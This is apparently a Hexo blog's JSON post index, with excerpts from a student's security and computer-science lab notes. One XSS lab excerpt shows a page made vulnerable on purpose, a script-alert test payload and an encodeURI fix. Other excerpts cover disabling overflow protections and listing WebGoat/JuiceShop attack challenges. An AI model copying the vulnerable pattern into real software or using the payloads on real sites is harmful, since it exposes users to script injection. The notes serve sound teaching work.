实验步骤寻找入侵函数 载入.pdb符号信息 .symfix确认ntdll.pdb路径 .reload载入符号信息 确定与打开相关的函数 根据命名规则，过滤名称有open的函数：x notepad!*open* x：以通配符的方式检查一个模块你内的符号地址 锁定ShowOpenSaveDialog，加上断点(breakpoint)后并执行(g)后，在记事本中文件-&gt;打开 bp notepad!ShowOpenSaveDialog Child-SP：当前调用栈的栈顶指针 RetAddr：函数返回地址 Call Site：调用函数 由此，证明ShowOpenSaveDialog是需要修改的函数 猜测是父进程(文字编辑窗口)调用了该函数打开了子进程(文件打开窗口)，证明 调用约定简化了：一律使用__fastcall，前四个参数用 RCX、RDX、R8 和 R9传递，除了这四个外加RAX、R10、R11，其他寄存器都是非易失的 查看寄存器信息 rcx与HWND(Handle to Window)的值的格式类似 可以假设rcx就是窗口句柄 覆盖rcx的值：r @rcx=0再从断点继续执行 实验结果","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Software Security","slug":"Security/Software-Security","permalink":"https://hejueyun.github.io/categories/Security/Software-Security/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"常见蜜罐体验和探索实验","date":"2020-01-04T15:01:59.000Z","path":"posts/be2a667b/","slug":"常见蜜罐体验和探索实验","permalink":"https://hejueyun.github.io/posts/be2a667b/","excerpt":"1. 实验目的 了解蜜罐的分类和基本原理 了解不同类型蜜罐的适用场合 掌握常见蜜罐的搭建和使用 2. 实验环境 蜜罐搭建：WSL2+Ubuntu18.04 nmap扫描：WSL2+Ubuntu18.04 SSH主机：本地Windows 10 3. 实验原理蜜罐 蜜罐其实就是一台无人使用但却被严密监控的网络主机,里面包含着各类虚假的高价值资源和一些已知漏洞,以此吸引入侵者来入侵该主机并且在被入侵的过程中,实时记录和审计入侵者的所有入侵攻击流量,行为和数据,以此了解入侵者的攻击方式,手段和目的,便于后期快速完成对其的溯源,取证工 低交互型蜜罐 A low interaction honeypot will only give an attacker very limited access to the operating system. ‘Low interaction’ means exactly that, the adversary will not be able to interact with your decoy system in any depth, as it is a much more static environment 中交互型蜜罐","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Network Security","slug":"Security/Network-Security","permalink":"https://hejueyun.github.io/categories/Security/Network-Security/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"数字内容安全备忘录","date":"2020-01-02T20:28:05.000Z","path":"posts/95418328/","slug":"数字内容安全备忘录","permalink":"https://hejueyun.github.io/posts/95418328/","excerpt":"1. 基础概念信息 它们均指与具体表达形式、编码无关的知识、事物、数据等含义 数字内容 数字内容是信息的一种表现形式 数字内容，就是以数字形式存在的文本、图像、声音、视频等信息，它可以存储在光盘、硬盘等数字载体 上，并通过网络等手段传播 空间分辨率(Spatial Resolution) Spatial resolution is a term that refers to the number of pixels utilized in construction of a digital image. Images having higher spatial resolution are composed with a greater number of pixels than those of lower spatial resolution 灰度分辨率(Gray-level Resolution) Gray-level resolution is a term that refers to the number of shades of gray utilized in preparing the image for display. Digital images having higher gray-level resolution are composed with a larger number of gray shades and are displayed at a greater bit depth than those of lower gray-level resolution. 灰度级分片(Gray Level Slicing) Grey level slicing is equivalent to band pass filtering. It manipulates group of intensity levels in an image up to specific range by diminishing rest or by leaving them alone.","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Content Security","slug":"Security/Content-Security","permalink":"https://hejueyun.github.io/categories/Security/Content-Security/"}],"tags":[]},{"title":"创建和使用DLL","date":"2020-01-01T21:45:42.000Z","path":"posts/1c6360a7/","slug":"C-创建和使用DLL","permalink":"https://hejueyun.github.io/posts/1c6360a7/","excerpt":"1. C++创建和使用DLL2. 实验目的 在 Visual Studio 中创建 DLL 项目。 将导出的函数和变量添加到该 DLL。 在 Visual Studio 中创建一个控制台应用项目。 在该控制台应用中使用从 DLL 导入的函数和变量。 运行已完成的应用。 手工编写DLL","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Software Security","slug":"Security/Software-Security","permalink":"https://hejueyun.github.io/categories/Security/Software-Security/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"进线程实验","date":"2020-01-01T16:15:26.000Z","path":"posts/8ebc7140/","slug":"c语言进线程实验","permalink":"https://hejueyun.github.io/posts/8ebc7140/","excerpt":"1. c语言进线程实验2. 实验目的 学习创建多线程的方法 学习创建子进程的方法 3. 实验环境 VS2019 4. 实验内容5. 创建线程示例12345678910111213141516171819202122232425262728293031323334353637383940414243444546typedef struct MyData &#123; int val1; int val2;&#125; MYDATA, *PMYDATA;for( int i=0; i&lt;MAX_THREADS; i++ ) &#123; // Allocate memory for thread data. pDataArray[i] = (PMYDATA) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(MYDATA)); if( pDataArray[i] == NULL ) &#123; // If the array allocation fails, the system is out of memory // so there is no point in trying to print an error message. // Just terminate execution. ExitProcess(2); &#125; // Generate unique data for each thread to work with. pDataArray[i]-&gt;val1 = i; pDataArray[i]-&gt;val2 = i+100; // Create the thread to begin execution on its own. hThreadArray[i] = CreateThread( NULL, // default security attributes 0, // use default stack size MyThreadFunction, // thread function name pDataArray[i], // argument to thread function 0, // use default creation flags &amp;dwThreadIdArray[i]); // returns the thread identifier // Check the return value for success. // If CreateThread fails, terminate execution. // This will automatically clean up threads and memory. if (hThreadArray[i] == NULL) &#123; ErrorHandler(TEXT(&quot;CreateThread&quot;)); ExitProcess(3); &#125; &#125; // End of main thread creation loop. 6. 创建单线程与多线程WaitForSingleObject","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Software Security","slug":"Security/Software-Security","permalink":"https://hejueyun.github.io/categories/Security/Software-Security/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"缓冲区溢出-漏洞利用","date":"2019-12-31T17:40:34.000Z","path":"posts/4569b1c4/","slug":"缓冲区溢出-漏洞利用","permalink":"https://hejueyun.github.io/posts/4569b1c4/","excerpt":"本博客内容旨在技术学习交流，仅供学习参考之用，请勿用于任何非法用途，否则后果作者概不负责 1. 实验目的 利用缓冲区溢出漏洞，执行本不应被调用的函数 2. 实验环境 VS2019 3. 实验内容4. 预备关闭IDE的安全检查 设置固定基址 链接器-&gt;固定基址-&gt;是 链接器-&gt;随机基址-&gt;否 链接器-&gt;基址：填写任意基址（实验中以0x40000000为例）","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Software Security","slug":"Security/Software-Security","permalink":"https://hejueyun.github.io/categories/Security/Software-Security/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"缓冲区溢出-原理探究实验","date":"2019-12-31T09:50:07.000Z","path":"posts/c80da54a/","slug":"缓冲区溢出-原理探究实验","permalink":"https://hejueyun.github.io/posts/c80da54a/","excerpt":"1. 实验目的 观察、测试和分析一段存在缓冲区溢出漏洞的代码 分析缓冲区溢出漏洞出现的原因和效果 2. 实验环境 VS2019 3. 实验原理4. 缓冲区溢出定义 A buffer overflow, or buffer overrun, is an anomaly where a program, while writing data to a buffer, overruns the buffer’s boundary and overwrites adjacent memory locations. 原因 Programming languages commonly associated with buffer overflows include C and C++, which provide no built-in protection against accessing or overwriting data in any part of memory and do not automatically check that data written to an array (the built-in buffer type) is within the boundaries of that array.","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Software Security","slug":"Security/Software-Security","permalink":"https://hejueyun.github.io/categories/Security/Software-Security/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"页面置换仿真实验","date":"2019-12-31T00:18:32.000Z","path":"posts/42c55725/","slug":"页面置换仿真实验","permalink":"https://hejueyun.github.io/posts/42c55725/","excerpt":"内容 FIFO LRU","categories":[{"name":"Operating System","slug":"Operating-System","permalink":"https://hejueyun.github.io/categories/Operating-System/"},{"name":"Lab","slug":"Operating-System/Lab","permalink":"https://hejueyun.github.io/categories/Operating-System/Lab/"}],"tags":[{"name":"Lab","slug":"Lab","permalink":"https://hejueyun.github.io/tags/Lab/"}]},{"title":"编译原理备忘录-绪论","date":"2019-12-23T21:39:43.000Z","path":"posts/10cff07b/","slug":"编译原理备忘录-绪论","permalink":"https://hejueyun.github.io/posts/10cff07b/","excerpt":"1. 编译过程 输入 过程 输出 词法分析 字符流 从左往右；单字符读入 识别的单词（token） 语法分析 单词组成的字符串（单词序列） 构建无二义语法树； 单词序列与语法短语之间的对应关系 语义分析 语法短语 审查语义错误 无错误或纠错后的短语 中间代码生成 语义分析后的短语 四元式 代码优化 四元式 优化后的四元式 目标代码生成 优化后的四元式 目标代码 2. 扩展巴克斯范式EBNF EBNF的基本语法形式如下，这个形式也被叫做production： 1左式(LeftHandSide) = 右式(RightHandSide). 左式也被叫做 非终端符号(non-terminal symbol)，而右式则描述了其的组成。 更多信息参考-1 更多信息参考-2 3. 符号字幕表 字幕表的闭包：${0,1}\\rightarrow {e,0,1,01,10…..}$ 符号串","categories":[{"name":"Compiler Construction","slug":"Compiler-Construction","permalink":"https://hejueyun.github.io/categories/Compiler-Construction/"},{"name":"Notes","slug":"Compiler-Construction/Notes","permalink":"https://hejueyun.github.io/categories/Compiler-Construction/Notes/"}],"tags":[{"name":"Notes","slug":"Notes","permalink":"https://hejueyun.github.io/tags/Notes/"}]},{"title":"webserver搭建及sql注入","date":"2019-12-21T15:31:29.000Z","path":"posts/f817c758/","slug":"webserver搭建及sql注入","permalink":"https://hejueyun.github.io/posts/f817c758/","excerpt":"1. 实验内容 搭建简易Webserver http.sever apache 实现简单的sql注入 2. 0. 简易Webserver3. 概念webserver A web server is server software, or hardware dedicated to running said software, that can satisfy World Wide Web client requests. A web server can, in general, contain one or more websites. A web server processes incoming network requests over HTTP and several other related protocols. 4. 实现http.server http.server允许我们搭建一个简易的网页服务器。 创建一个index.htm(或者index.html) 在终端中键入python -m http.server 8000 --bind 127.0.0.1 在浏览器中打开localhost:8000 Apache","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Software Security","slug":"Security/Software-Security","permalink":"https://hejueyun.github.io/categories/Security/Software-Security/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"Python厨书笔记-4","date":"2019-12-19T23:26:36.000Z","path":"posts/aba0da9/","slug":"python厨书笔记-4","permalink":"https://hejueyun.github.io/posts/aba0da9/","excerpt":"数字日期和时间","categories":[{"name":"Program Language","slug":"Program-Language","permalink":"https://hejueyun.github.io/categories/Program-Language/"},{"name":"Python","slug":"Program-Language/Python","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/"},{"name":"Cookbook","slug":"Program-Language/Python/Cookbook","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/Cookbook/"}],"tags":[{"name":"Cookbook","slug":"Cookbook","permalink":"https://hejueyun.github.io/tags/Cookbook/"}]},{"title":"搭建简易XSS实验环境","date":"2019-12-19T21:56:39.000Z","path":"posts/a9cf1fba/","slug":"搭建简易XSS实验环境","permalink":"https://hejueyun.github.io/posts/a9cf1fba/","excerpt":"1. 0. DOM Based XSS1.1. 概念 XSS Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it. 跨网站脚本攻击(XSS)是一种注入式攻击，将恶意脚本注入到原本良性和可信的网站中。XSS 攻击是指攻击者利用网络应用程序向不同的终端用户发送恶意代码，通常以浏览器端脚本的形式进行攻击。允许这些攻击成功的漏洞相当普遍，而且在网络应用程序未经验证或编码而在其生成的输出中使用用户输入的任何地方都会发生。 DOM：文档对象模型（Document Object Model，简称DOM） DOM Based XSS DOM Based XSS (or as it is called in some texts, “type-0 XSS”) is an XSS attack wherein the attack payload is executed as a result of modifying the DOM “environment” in the victim’s browser used by the original client side script, so that the client side code runs in an “unexpected” manner. That is, the page itself (the HTTP response that is) does not change, but the client side code contained in the page executes differently due to the malicious modifications that have occurred in the DOM environment. 基于DOM的XSS（或在某些文本中被称为 “0型XSS”）是一种XSS攻击，在这种攻击中，攻击的有效载荷是由于修改了受害者浏览器中的DOM “环境”，使客户端代码以 “意外 “的方式运行。也就是说，页面本身（即HTTP响应）并没有改变，但页面中包含的客户端代码由于在DOM环境中发生了恶意修改而以不同的方式执行。 1.2. 实现 构建有DOM XSS漏洞的网页代码 123456789101112131415&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt; &lt;script&gt; function displayTxt()&#123; var c=document.getElementById(&quot;xss&quot;).value; document.write(&quot;你输入的内容是：&quot;+c); &#125; &lt;/script&gt; &lt;input type=&quot;text&quot; name=&quot;txt&quot; id=&#x27;xss&#x27; /&gt; &lt;input type=&quot;button&quot; value=&quot;show&quot; onclick=&quot;displayTxt();&quot; /&gt;&lt;/body&gt;&lt;/html&gt;&lt;!-- &lt;script&gt;alert(document.URL);&lt;/script&gt; --&gt; 如果在写之前没有调用document.open, 浏览器会自动调用open。每次写完关闭之后重新调用该函数，会导致页面被重写 打开网页，在表单中键入&lt;script&gt;alert(document.URL);&lt;/script&gt;，提交表单。网页会弹窗显示网页的URL地址，证明该页面存在XSS漏洞 1.3. 填补漏洞 由于对用户输入的信息中的未进行过滤，导致恶意代码得以被执行 因此只需要对用户输入信息进行转义即可 1var c=encodeURI(document.getElementById(&quot;xss&quot;).value); 再次提交先前的恶意代码，结果显示了被转义后的内容 2. 1. Stored XSS2.1. 概念 Stored XSS Stored XSS occurs when a web application gathers input from a user which might be malicious, and then stores that input in a data store for later use. The input that is stored is not correctly filtered. As a consequence, the malicious data will appear to be part of the web site and run within the user’s browser under the privileges of the web application. Since this vulnerability typically involves at least two requests to the application, this may also called second-order XSS. 存储型XSS是指网络应用程序从用户处收集可能是恶意的输入，然后将这些输入存储在数据存储中供日后使用。被存储的输入没有经过正确的过滤。因此，恶意数据会被视为网站的一部分，并在用户的浏览器中以网络应用的权限运行。由于这个漏洞通常会涉及到至少两次对应用程序的请求，因此也可以称为第二类XSS Flask Flask configures Jinja2 to automatically escape all values unless explicitly told otherwise. This should rule out all XSS problems caused in templates, but there are still other places where you have to be careful There is one class of XSS issues that Jinja’s escaping does not protect against. The a tag’s href attribute can contain a javascript: URI, which the browser will execute when clicked if not secured properly","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Software Security","slug":"Security/Software-Security","permalink":"https://hejueyun.github.io/categories/Security/Software-Security/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"银行家算法仿真","date":"2019-12-17T11:51:08.000Z","path":"posts/192efbf7/","slug":"银行家算法仿真","permalink":"https://hejueyun.github.io/posts/192efbf7/","excerpt":"内容 python实现银行家算法","categories":[{"name":"Operating System","slug":"Operating-System","permalink":"https://hejueyun.github.io/categories/Operating-System/"},{"name":"Lab","slug":"Operating-System/Lab","permalink":"https://hejueyun.github.io/categories/Operating-System/Lab/"}],"tags":[{"name":"Lab","slug":"Lab","permalink":"https://hejueyun.github.io/tags/Lab/"}]},{"title":"Python厨书笔记-3","date":"2019-12-15T09:05:11.000Z","path":"posts/94de980a/","slug":"python厨书笔记-3","permalink":"https://hejueyun.github.io/posts/94de980a/","excerpt":"字符串与文本","categories":[{"name":"Program Language","slug":"Program-Language","permalink":"https://hejueyun.github.io/categories/Program-Language/"},{"name":"Python","slug":"Program-Language/Python","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/"},{"name":"Cookbook","slug":"Program-Language/Python/Cookbook","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/Cookbook/"}],"tags":[{"name":"Cookbook","slug":"Cookbook","permalink":"https://hejueyun.github.io/tags/Cookbook/"}]},{"title":"Python厨书笔记-2","date":"2019-12-14T09:58:44.000Z","path":"posts/e3d9a89c/","slug":"python厨书笔记-2","permalink":"https://hejueyun.github.io/posts/e3d9a89c/","excerpt":"数据结构与算法(二)","categories":[{"name":"Program Language","slug":"Program-Language","permalink":"https://hejueyun.github.io/categories/Program-Language/"},{"name":"Python","slug":"Program-Language/Python","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/"},{"name":"Cookbook","slug":"Program-Language/Python/Cookbook","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/Cookbook/"}],"tags":[{"name":"Cookbook","slug":"Cookbook","permalink":"https://hejueyun.github.io/tags/Cookbook/"}]},{"title":"操作系统备忘录-虚拟存储器","date":"2019-12-13T15:24:26.000Z","path":"posts/f97dfd7c/","slug":"操作系统备忘录-虚拟存储器","permalink":"https://hejueyun.github.io/posts/f97dfd7c/","excerpt":"1. 虚拟存储器概述内存扩容的方式 物理 逻辑——虚拟存储管理","categories":[{"name":"Operating System","slug":"Operating-System","permalink":"https://hejueyun.github.io/categories/Operating-System/"},{"name":"Notes","slug":"Operating-System/Notes","permalink":"https://hejueyun.github.io/categories/Operating-System/Notes/"}],"tags":[{"name":"Notes","slug":"Notes","permalink":"https://hejueyun.github.io/tags/Notes/"}]},{"title":"Python厨书笔记-1","date":"2019-12-13T00:10:59.000Z","path":"posts/7ad0f926/","slug":"python厨书笔记-1","permalink":"https://hejueyun.github.io/posts/7ad0f926/","excerpt":"数据结构与算法（一）","categories":[{"name":"Program Language","slug":"Program-Language","permalink":"https://hejueyun.github.io/categories/Program-Language/"},{"name":"Python","slug":"Program-Language/Python","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/"},{"name":"Cookbook","slug":"Program-Language/Python/Cookbook","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/Cookbook/"}],"tags":[{"name":"Cookbook","slug":"Cookbook","permalink":"https://hejueyun.github.io/tags/Cookbook/"}]},{"title":"实验:LL1-LR计算器","date":"2019-12-12T15:26:53.000Z","path":"posts/68fee423/","slug":"LL1-LR计算器","permalink":"https://hejueyun.github.io/posts/68fee423/","excerpt":"内容 LL1计算器","categories":[{"name":"Compiler Construction","slug":"Compiler-Construction","permalink":"https://hejueyun.github.io/categories/Compiler-Construction/"},{"name":"Lab","slug":"Compiler-Construction/Lab","permalink":"https://hejueyun.github.io/categories/Compiler-Construction/Lab/"}],"tags":[{"name":"Lab","slug":"Lab","permalink":"https://hejueyun.github.io/tags/Lab/"}]},{"title":"实验:基于对比度增强的数字图像取证","date":"2019-12-09T10:15:00.000Z","path":"posts/1d8f885/","slug":"基于对比度增强的数字图像取证","permalink":"https://hejueyun.github.io/posts/1d8f885/","excerpt":"1. 原理2. 0. 直方图归一化(Histogram normalization)目的 In image processing, normalization is a process that changes the range of pixel intensity values. In more general fields of data processing, such as digital signal processing, it is referred to as dynamic range expansion. The purpose of dynamic range expansion in the various applications is usually to bring the image, or other type of signal, into a range that is more familiar or normal to the senses, hence the term normalization. For example, a newspaper will strive to make all of the images in an issue share a similar range of grayscale. After applying certain processing operations to the input image, the gray levels of the resulting image are no longer necessarily within the proper range for display. In this case the image needs to be normalized or rescaled 实现 $y&#x3D;f(x)&#x3D;255\\frac{x-x_{min}}{x_{max}-x_{min}}$ $x_{max}$，$x_{min}$：图像像素的最值 Remark: $x_{max}&#x3D;255,x_{min}&#x3D;0$，显然不需要归一化 3. 1. 需求3.1. 现实需求 In the applications such as law enforcement and news recording, it is necessary to verify the originality and authenticity of digital images, and make clear the image manipulation history to get more information.","categories":[{"name":"Computer Graphics","slug":"Computer-Graphics","permalink":"https://hejueyun.github.io/categories/Computer-Graphics/"},{"name":"Lab","slug":"Computer-Graphics/Lab","permalink":"https://hejueyun.github.io/categories/Computer-Graphics/Lab/"}],"tags":[{"name":"Lab","slug":"Lab","permalink":"https://hejueyun.github.io/tags/Lab/"}]},{"title":"Note-Metaphysics-0","date":"2019-12-06T22:34:35.000Z","path":"posts/a13c022f/","slug":"Note-Metaphysics-0","permalink":"https://hejueyun.github.io/posts/a13c022f/","excerpt":"1. Previewthe First Cause —— 第一因 First cause, in philosophy, the self-created being (i.e., God) to which every chain of causes must ultimately go back. The term was used by Greek thinkers and became an underlying assumption in the Judeo-Christian tradition. Many philosophers and theologians in this tradition have formulated an argument for the existence of God by claiming that the world that man observes with his senses must have been brought into being by God as the first cause. … It can only be accounted for by the existence of a first cause; this first cause, however, must not be considered simply as the first in a series of continuing causes, but rather as first cause in the sense of being the cause for the whole series of observable causes. medieval /ˌmediˈiːvl/ connected with the Middle Ages (about AD 1000 to AD 1450) The unmoved mover The way in which Aristotle seeks to show that the universe is a single causal system is through an examination of the notion of movement … Aristotle’s fundamental principle is that everything that is in motion is moved by something else … He then argues that there cannot be an infinite series of moved movers. If it is true that when A is in motion there must be some B that moves A, then if B is itself in motion there must be some C moving B, and so on. This series cannot go on forever, and so it must come to a halt in some X that is a cause of motion but does not move itself—an unmoved mover. Being For Aristotle, “being” is whatever is anything whatever. Whenever Aristotle explains the meaning of being, he does so by explaining the sense of the Greek verb to be. Being contains whatever items can be the subjects of true propositions containing the word is, whether or not the is is followed by a predicate.","categories":[],"tags":[{"name":"essay","slug":"essay","permalink":"https://hejueyun.github.io/tags/essay/"}]},{"title":"编译原理备忘录-语法制导","date":"2019-12-05T13:42:35.000Z","path":"posts/8992f96e/","slug":"编译原理备忘录-语法制导","permalink":"https://hejueyun.github.io/posts/8992f96e/","excerpt":"内容 语义计算 静态语义分析 中间代码生成 代码优化","categories":[{"name":"Compiler Construction","slug":"Compiler-Construction","permalink":"https://hejueyun.github.io/categories/Compiler-Construction/"},{"name":"Notes","slug":"Compiler-Construction/Notes","permalink":"https://hejueyun.github.io/categories/Compiler-Construction/Notes/"}],"tags":[{"name":"Notes","slug":"Notes","permalink":"https://hejueyun.github.io/tags/Notes/"}]},{"title":"操作系统备忘录--处理机","date":"2019-11-30T14:48:32.000Z","path":"posts/ad1bb4ae/","slug":"操作系统备忘录-处理机","permalink":"https://hejueyun.github.io/posts/ad1bb4ae/","excerpt":"内容 处理机 作业与作业步 作业调度 进(线)程调度 实时调度","categories":[{"name":"Operating System","slug":"Operating-System","permalink":"https://hejueyun.github.io/categories/Operating-System/"},{"name":"Notes","slug":"Operating-System/Notes","permalink":"https://hejueyun.github.io/categories/Operating-System/Notes/"}],"tags":[{"name":"Notes","slug":"Notes","permalink":"https://hejueyun.github.io/tags/Notes/"}]},{"title":"操作系统备忘录--存储器管理","date":"2019-11-29T15:31:15.000Z","path":"posts/836ff012/","slug":"操作系统备忘录-存储器管理","permalink":"https://hejueyun.github.io/posts/836ff012/","excerpt":"内容：课件整理 存储器的层级结构 程序的装入和链接 连续分配存储 分页存储管理方式 分段存储管理方式","categories":[{"name":"Operating System","slug":"Operating-System","permalink":"https://hejueyun.github.io/categories/Operating-System/"},{"name":"Notes","slug":"Operating-System/Notes","permalink":"https://hejueyun.github.io/categories/Operating-System/Notes/"}],"tags":[{"name":"Notes","slug":"Notes","permalink":"https://hejueyun.github.io/tags/Notes/"}]},{"title":"实验:LR分析器实现","date":"2019-11-29T10:15:19.000Z","path":"posts/e56ee2b/","slug":"LR分析器实现","permalink":"https://hejueyun.github.io/posts/e56ee2b/","excerpt":"内容 构造LR(0)分析表 对输入字符串进行LR分析检测","categories":[{"name":"Compiler Construction","slug":"Compiler-Construction","permalink":"https://hejueyun.github.io/categories/Compiler-Construction/"},{"name":"Lab","slug":"Compiler-Construction/Lab","permalink":"https://hejueyun.github.io/categories/Compiler-Construction/Lab/"}],"tags":[{"name":"Lab","slug":"Lab","permalink":"https://hejueyun.github.io/tags/Lab/"}]},{"title":"实验:模拟作业调度算法","date":"2019-11-26T12:25:40.000Z","path":"posts/ce254701/","slug":"python模拟作业调度算法","permalink":"https://hejueyun.github.io/posts/ce254701/","excerpt":"内容 先来先服务法FCFS 短作业优先法SJF 最高响应比优先HRRN 时间片轮转RR","categories":[{"name":"Operating System","slug":"Operating-System","permalink":"https://hejueyun.github.io/categories/Operating-System/"},{"name":"Lab","slug":"Operating-System/Lab","permalink":"https://hejueyun.github.io/categories/Operating-System/Lab/"}],"tags":[{"name":"Lab","slug":"Lab","permalink":"https://hejueyun.github.io/tags/Lab/"}]},{"title":"实验:Jsteg水印的PSNR~C水印攻击以及卡方分析","date":"2019-11-25T15:04:26.000Z","path":"posts/6572c97c/","slug":"Jsteg的PSNR-C水印攻击","permalink":"https://hejueyun.github.io/posts/6572c97c/","excerpt":"内容： 实现Jsteg水印算法以及psnr~C水印分析","categories":[{"name":"Computer Graphics","slug":"Computer-Graphics","permalink":"https://hejueyun.github.io/categories/Computer-Graphics/"},{"name":"Lab","slug":"Computer-Graphics/Lab","permalink":"https://hejueyun.github.io/categories/Computer-Graphics/Lab/"}],"tags":[{"name":"Lab","slug":"Lab","permalink":"https://hejueyun.github.io/tags/Lab/"}]},{"title":"图像水印算法","date":"2019-11-25T10:22:19.000Z","path":"posts/f9b0a435/","slug":"图像水印算法","permalink":"https://hejueyun.github.io/posts/f9b0a435/","excerpt":"内容 LSB Patchwork 扩频水印 QIM Jsteg Wong 直方图可逆 1. 基本概念1.1. 信息隐藏 密码技术主要是研究如何将机密信息进行特殊的编码，以形成不可识别的密码形式 (密文)进行传递；而信息隐藏则主要研究如何将某一机密信息秘密隐藏于另一公开的信息(载体)中，然后通过公开信息的传输来传递机密信息。对加密通信而言，可能的监测者或非法拦截者可通过截取密文，并对其进行破译，或将密文进行破坏后再发送，从而影响机密信息的安全；但对信息隐藏而言，可能的监测者或非法拦截者则难以从公开信息中判断机密信息是否存在，难以截获机密信息，从而能保证机密信息的安全。 通道不同：秘密与公开 信息不同：秘密信息与公开载体(信息) 模型 信息隐藏特点 鲁棒性 指不因图象文件的某种改动而导致隐藏信息丢失的能力 不可检测性 指隐蔽载体与原始载体具有一致的特性。如具有一致的统计噪声分布等 透明性 利用人类视觉系统或人类听觉系统属性，经过一系列隐藏处理 ，使目标数据没有明显的降质现象 ，而隐藏的数据却无法人为地看见或听见 视觉质量失真度量 峰值信噪比 安全性 指隐藏算法有较强的抗攻击能力 ，即它必须能够承受一定程度的人为攻击 ，而使隐藏信息不会被破坏 自恢复性 由于经过一些操作或变换后 ，可能会使原图产生较大的破坏 ，如果只从留下的片段数据 ，仍能恢复隐藏信号 ，而且恢复过程不需要宿主信号 ，这就是所谓的自恢复性","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Content Security","slug":"Security/Content-Security","permalink":"https://hejueyun.github.io/categories/Security/Content-Security/"}],"tags":[{"name":"Notes","slug":"Notes","permalink":"https://hejueyun.github.io/tags/Notes/"}]},{"title":"实验:读写者问题","date":"2019-11-15T18:23:02.000Z","path":"posts/b0a4dc50/","slug":"c语言实现读写者问题","permalink":"https://hejueyun.github.io/posts/b0a4dc50/","excerpt":"内容 c语言解决读写者问题 不规范警告：统一用临界区实现","categories":[{"name":"Operating System","slug":"Operating-System","permalink":"https://hejueyun.github.io/categories/Operating-System/"},{"name":"Lab","slug":"Operating-System/Lab","permalink":"https://hejueyun.github.io/categories/Operating-System/Lab/"}],"tags":[{"name":"Lab","slug":"Lab","permalink":"https://hejueyun.github.io/tags/Lab/"}]},{"title":"HTTP代理服务器实验","date":"2019-11-15T16:29:39.000Z","path":"posts/2f0ee4e4/","slug":"HTTP代理服务器实验","permalink":"https://hejueyun.github.io/posts/2f0ee4e4/","excerpt":"本博客内容旨在技术学习交流，仅供学习参考之用，请勿用于任何非法用途，否则后果作者概不负责 内容 tinyproxy建立正向代理 提取pcap包中的SSL证书 解密本地主机HTTPS流量","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Network Security","slug":"Security/Network-Security","permalink":"https://hejueyun.github.io/categories/Security/Network-Security/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"WebGoat、JuiceShop搭建以及实验","date":"2019-11-15T09:54:58.000Z","path":"posts/34bee1f0/","slug":"WebGoat、JuiceShop搭建与实验","permalink":"https://hejueyun.github.io/posts/34bee1f0/","excerpt":"本博客内容旨在技术学习交流，仅供学习参考之用，请勿用于任何非法用途，否则后果作者概不负责 内容 WebGoat Authentication Flaws Forgot Password Cross-Site Scripting Stored XSS Attacks Injection Flaws Command Injection Malicious Execution Malicious File Execution Parameter Tampering Bypass HTML Field Restrictions JuiceShop Find the carefully hidden ‘Score Board’ page Access a confidential document Order the Christmas special offer of 2014 Access the administration section of the store Log in with the administrator’s user account Post a product review as another user or edit any user’s existing review","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Network Security","slug":"Security/Network-Security","permalink":"https://hejueyun.github.io/categories/Security/Network-Security/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"实验:基于奇偶校验的LSB算法及卡方分析","date":"2019-11-11T14:53:41.000Z","path":"posts/42a865c0/","slug":"python基于奇偶校验的LSB算法及卡方分析","permalink":"https://hejueyun.github.io/posts/42a865c0/","excerpt":"内容： 奇偶校验的LSB水印隐写算法 基于卡方分析的隐写分析","categories":[{"name":"Computer 